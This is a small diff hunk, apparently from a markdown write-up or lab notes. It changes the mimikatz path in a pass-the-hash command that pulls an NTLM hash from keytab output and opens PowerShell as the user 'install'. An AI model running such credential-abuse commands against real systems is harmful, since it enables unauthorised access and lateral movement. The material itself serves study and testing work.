@@ -53,7 +53,7 @@ $keytab = -join $keytab
 $keytab -match '\(0x(?<Hash>[a-z0-9]+)\)'
 $Matches.Hash
 
-C:\mimikatz_trunk\x64\mimikatz.exe "sekurlsa::pth /user:install /domain:a /ntlm:$($Matches.Hash) /run:powershell" exit
+C:\mimikatz\x64\mimikatz.exe "sekurlsa::pth /user:install /domain:a /ntlm:$($Matches.Hash) /run:powershell" exit
 ```
 
 </details>
